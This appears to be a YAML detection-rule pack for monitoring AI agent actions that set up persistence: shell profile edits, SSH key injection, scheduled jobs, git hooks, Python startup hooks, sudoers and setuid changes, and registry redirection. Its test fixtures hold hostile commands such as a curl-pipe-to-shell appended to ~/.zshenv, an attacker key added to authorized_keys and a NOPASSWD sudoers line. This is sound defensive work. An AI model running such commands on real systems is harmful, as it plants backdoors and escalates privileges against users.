# Persistence: anything that makes code run again later, outside the
# session that wrote it. Agent and IDE auto-run configuration is in the
# agent-integrity pack.
pack: persistence
version: "2026.11.0"
description: Shell profiles, SSH keys, scheduled jobs, services, interpreter startup hooks and package-manager redirection.
rules:
  - id: SPR-PERS-001
    title: Shell startup file modified
    description: >-
      A tool or command writes ~/.bashrc, ~/.zshrc, ~/.zshenv, ~/.profile or
      a PowerShell profile. Every new shell runs it: s1ngularity appended
      "sudo shutdown -h 0", Overpatch wrote ~/.zshrc through a parent-dir
      patch, and a worktree fsmonitor wrote ~/.zshenv.
    kind: activity
    class: finding
    severity: medium
    confidence: medium
    maturity: stable
    category: persistence
    tags: [attack.t1546.004, owasp.asi05]
    references:
      - "research/threats.md section 2 row 1: s1ngularity (shutdown appended to ~/.bashrc, ~/.zshrc)"
      - "research/threats.md section 2 row 11: CVE-2026-55607; row 18: Overpatch"
      - "research/threats.md section 3 R39"
    falsepositives:
      - "Installers and setup steps that add a PATH line or an alias"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - shell.persistence: shell_profile
        - shell.write_classes: shell_profile
        - all:
            - tool.kind|in: [file_write, file_edit]
            - path.classes: shell_profile
    dedup: [target.path, shell.writes]
    evidence: [target.path, target.command, shell.writes]
    remedy: Diff the startup file; remove anything that is not a PATH or alias line the user asked for.
    tests:
      - name: echo appended to zshenv
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "echo 'curl -s x.example | sh' >> ~/.zshenv" } }
        expect: match
      - name: Edit tool on bashrc
        event: { type: tool.pre, tool: { kind: file_edit, name: Edit }, target: { path: /home/tester/.bashrc } }
        expect: match
      - name: reading bashrc
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "grep -n PATH ~/.bashrc" } }
        expect: no_match
      - name: project script named profile
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/scripts/profile.sh } }
        expect: no_match

  - id: SPR-PERS-002
    title: SSH authorized_keys modified
    description: >-
      A key is added to an authorized_keys file, which grants whoever holds
      the private key a login as this user. GhostApproval reached it through
      a repository symlink shown to the user as a project file.
    kind: activity
    class: alert
    severity: high
    confidence: high
    maturity: stable
    category: persistence
    tags: [attack.t1098.004, owasp.asi03]
    references:
      - "research/threats.md section 2 row 17: GhostApproval CVE-2026-12958"
      - "research/threats.md section 3 R39"
    falsepositives:
      - "Provisioning a test VM's authorized_keys from inside an agent session"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - shell.persistence: ssh_authorized_keys
        - shell.write_classes: ssh_authorized_keys
        - all:
            - tool.kind|in: [file_write, file_edit]
            - path.classes: ssh_authorized_keys
    dedup: [target.path, shell.writes]
    evidence: [target.path, target.command, shell.writes]
    remedy: Remove keys that the user did not add and check the session for what led to the write.
    tests:
      - name: key appended
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_keys" } }
        expect: match
      - name: Write tool on authorized_keys
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/.ssh/authorized_keys } }
        expect: match
      - name: listing authorized keys
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "cat ~/.ssh/authorized_keys | wc -l" } }
        expect: no_match
      - name: generating a project deploy key
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ssh-keygen -t ed25519 -N '' -f ./deploy/test_key" } }
        expect: no_match

  - id: SPR-PERS-003
    title: Scheduled job, service or login item registered
    description: >-
      crontab, at, systemctl enable, launchctl load, schtasks /create, a Run
      registry key or a login item: something will start without the agent
      or the user asking again.
    kind: activity
    class: finding
    severity: medium
    confidence: medium
    maturity: stable
    category: persistence
    tags: [attack.t1053.003, attack.t1053.005, attack.t1543.001, attack.t1543.002, attack.t1547.001, owasp.asi05]
    references:
      - "research/threats.md section 2 row 26: Shai-Hulud 2.0 self-hosted runner registration"
      - "research/threats.md section 3 R39"
    falsepositives:
      - "Setting up a development service the user asked for"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - shell.persistence|contains_any: [cron, launchd, systemd, scheduled_task, registry_run, login_item, at_job]
        - shell.write_classes|contains_any: [cron, launchd, systemd_unit]
        - all:
            - tool.kind|in: [file_write, file_edit]
            - path.classes|contains_any: [cron, launchd, systemd_unit]
    dedup: [shell.persistence, target.path]
    evidence: [target.command, target.path, shell.persistence]
    remedy: List the job or unit and remove it if the user did not ask for it.
    tests:
      - name: crontab entry
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "(crontab -l; echo '*/5 * * * * /tmp/x') | crontab -" } }
        expect: match
      - name: launch agent written
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/Library/LaunchAgents/com.x.plist } }
        expect: match
      - name: list crontab
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "crontab -l" } }
        expect: no_match
      - name: service status
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "systemctl status nginx" } }
        expect: no_match

  - id: SPR-PERS-004
    title: Git hook installed or removed
    description: >-
      A file under .git/hooks is written or deleted. Hook managers (husky,
      pre-commit) do this routinely, so a signal; a hook is code every git
      command in the repository runs.
    kind: activity
    class: signal
    severity: low
    confidence: medium
    maturity: stable
    category: persistence
    tags: [owasp.asi05]
    references:
      - "research/threats.md section 3 R38, R39"
    falsepositives:
      - "Installing hooks with husky, pre-commit or lefthook"
      - "Removing a stale hook at the user's request"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - shell.persistence: git_hook
        - shell.write_classes: vcs_hook
        - shell.delete_classes: vcs_hook
        - all:
            - tool.kind|in: [file_write, file_edit]
            - path.classes: vcs_hook
    dedup: [target.path, shell.writes]
    evidence: [target.path, target.command]
    remedy: No action on its own.
    tests:
      - name: hook copied in
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "cp hook.sh .git/hooks/pre-commit" } }
        expect: match
      - name: list hooks
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "ls .git/hooks" } }
        expect: no_match
      - name: hooks directory in source
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/internal/hooks/hooks.go } }
        expect: no_match

  - id: SPR-PERS-005
    title: Python startup hook written
    description: >-
      A .pth file or sitecustomize.py / usercustomize.py is written. Python
      executes these on every interpreter start, for every script the user
      runs, which makes them a quiet persistence and a supply-chain foothold.
    kind: activity
    class: finding
    severity: high
    confidence: high
    maturity: stable
    category: persistence
    tags: [owasp.asi05]
    references:
      - "research/threats.md section 3 R39 (*.pth, sitecustomize.py)"
    falsepositives:
      - "Editable installs that write a .pth through a file tool instead of pip"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - all:
            - tool.kind|in: [file_write, file_edit]
            - target.path|endswith: [".pth", sitecustomize.py, usercustomize.py]
        - shell.writes|any_endswith: [".pth", sitecustomize.py, usercustomize.py]
    dedup: [target.path, shell.writes]
    evidence: [target.path, target.command, shell.writes]
    remedy: Read the file; a startup hook should only adjust sys.path.
    tests:
      - name: pth in dist-packages
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "echo 'import os' > /usr/lib/python3/dist-packages/evil.pth" } }
        expect: match
      - name: sitecustomize written by a tool
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/.local/lib/python3.12/site-packages/sitecustomize.py } }
        expect: match
      - name: ordinary python module
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/customize.py } }
        expect: no_match
      - name: depth file in a PyTorch project
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/model.pth.json } }
        expect: no_match

  - id: SPR-PERS-006
    title: Sudoers, setuid or setgid change
    description: >-
      The sudoers configuration is edited or a file is made setuid or
      setgid. Either gives a later process elevated rights without a
      password. setgid on a directory only makes new files inherit its
      group, so the analyser does not report it for a directory the same
      command line created (mkdir, install -d) or a target written with a
      trailing slash; chmod 2750 on spoor's own outbox directory was the
      only source of this rule's hits in the release benign replay.
    kind: activity
    class: finding
    severity: high
    confidence: high
    maturity: stable
    category: privilege_escalation
    tags: [attack.t1548.003, attack.t1548.001, owasp.asi03]
    references:
      - "research/threats.md section 3 R39"
    falsepositives:
      - "Provisioning a disposable container image"
      - "A shared group directory made setgid that this command line did not create"
    when:
      type: [tool.pre, process.exec]
    match:
      shell.privilege|contains_any: [sudoers_edit, setuid_chmod, setgid_chmod]
    dedup: [shell.privilege]
    evidence: [target.command, shell.privilege]
    remedy: Revert the change unless an administrator asked for it.
    tests:
      - name: NOPASSWD appended
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "echo 'x ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" } }
        expect: match
      - name: setuid bash copy
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chmod u+s /tmp/bash" } }
        expect: match
      - name: sudo for a package install
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "sudo apt-get install -y jq" } }
        expect: no_match
      - name: chmod +x a script
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chmod +x scripts/build.sh" } }
        expect: no_match
      - name: setuid by a five-digit octal mode
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chmod 04755 /tmp/bash" } }
        expect: match
      - name: setgid program
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chmod g+s /tmp/bash" } }
        expect: match
      - name: setgid on a directory the line created
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "mkdir -p pt/data/outbox && chmod 2750 pt/data/outbox" } }
        expect: no_match
      - name: setgid on a directory written with a trailing slash
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chmod g+s shared/" } }
        expect: no_match
      - name: sticky bit
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "chmod 1777 /tmp/scratch" } }
        expect: no_match

  - id: SPR-PERS-007
    title: Package manager pointed at a different registry
    description: >-
      npm, pip, yarn or uv configuration is changed to use another registry
      or index (npm config set registry, pip config set global.index-url, a
      registry= line in .npmrc). Every later install then resolves names
      against that host, which is a durable dependency-confusion foothold.
    kind: activity
    class: finding
    severity: medium
    confidence: medium
    maturity: experimental
    category: persistence
    tags: [attack.t1195.001, owasp.asi04]
    references:
      - "research/threats.md section 3 R39 (.npmrc registry, pip.conf index)"
    falsepositives:
      - "Configuring the organisation's package mirror"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - any_command:
            name|in: [npm, pnpm, yarn]
            args|contains_all: [config, set]
            args|any_re: "registry"
        - any_command:
            name|in: [pip, pip3, uv]
            args|contains_all: [config, set]
            args|any_re: "index-url"
        - all:
            - shell.write_classes|contains_any: [npm_token, pypi_token]
            - shell.urls|exists: true
    allow:
      shell.urls|in_list: approved_package_indexes
    dedup: [shell.hosts]
    evidence: [target.command, shell.hosts]
    remedy: Check the registry host; revert the configuration unless it is the organisation's mirror.
    tests:
      - name: npm registry set
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm config set registry https://npm.evil.example" } }
        expect: match
      - name: pip index set
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip config set global.index-url https://evil.example/simple" } }
        expect: match
      - name: registry reset to the public default
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm config set registry https://registry.npmjs.org/" } }
        expect: no_match
      - name: npm config get
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm config get registry" } }
        expect: no_match
